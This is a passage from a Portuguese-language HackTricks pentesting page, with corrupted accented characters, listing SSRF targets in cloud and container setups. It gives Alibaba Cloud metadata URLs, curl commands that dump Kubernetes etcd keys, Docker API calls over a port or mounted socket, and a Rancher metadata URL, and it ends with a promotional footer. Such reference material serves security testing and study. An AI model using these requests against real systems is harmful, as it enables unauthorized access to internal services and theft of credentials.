Alibaba √© uma plataforma de nuvem chinesa que oferece servi√ßos de computa√ß√£o em nuvem, armazenamento em nuvem e banco de dados em nuvem. A plataforma √© usada principalmente na China e no sudeste asi√°tico. A Alibaba Cloud oferece uma ampla gama de servi√ßos, incluindo computa√ß√£o, armazenamento, banco de dados, rede, seguran√ßa, an√°lise de dados, intelig√™ncia artificial e Internet das coisas (IoT). A plataforma √© conhecida por sua escalabilidade, confiabilidade e seguran√ßa. No entanto, como em qualquer plataforma em nuvem, existem riscos de seguran√ßa, como SSRF, que os testadores de penetra√ß√£o devem estar cientes.
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```
## Kubernetes ETCD <a href="#c80a" id="c80a"></a>

Pode conter chaves de API e IPs e portas internas.
```
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```
## Docker <a href="#ac0b" id="ac0b"></a>

Docker √© uma plataforma de software que permite criar, testar e implantar aplicativos rapidamente. Ele empacota um aplicativo e todas as suas depend√™ncias em um cont√™iner virtual que pode ser executado em qualquer sistema operacional. O Docker √© amplamente utilizado em ambientes de desenvolvimento e produ√ß√£o para simplificar o processo de implanta√ß√£o de aplicativos. No entanto, o Docker tamb√©m pode ser usado para explorar vulnerabilidades de SSRF em aplicativos em cont√™iner.
```
http://127.0.0.1:2375/v1.24/containers/jsonSimple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```
## Rancher <a href="#8cb7" id="8cb7"></a>

Rancher √© uma plataforma de gerenciamento de cont√™ineres que permite implantar e gerenciar facilmente cont√™ineres em um ambiente de produ√ß√£o. Ele suporta v√°rias orquestradores de cont√™ineres, como Kubernetes, Docker Swarm e Mesos. O Rancher tamb√©m oferece recursos de seguran√ßa, como autentica√ß√£o de usu√°rio, gerenciamento de certificados e pol√≠ticas de rede.

No entanto, o Rancher tamb√©m pode ser vulner√°vel a SSRF se n√£o for configurado corretamente. Por exemplo, se o Rancher estiver sendo executado em um servidor com uma interface de rede p√∫blica, um invasor pode explorar uma SSRF para acessar recursos internos da rede. Al√©m disso, o Rancher permite que os usu√°rios implantem cont√™ineres em qualquer host registrado, o que pode levar a uma SSRF se um host malicioso for adicionado √† plataforma.
```
curl http://rancher-metadata/<version>/<path>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
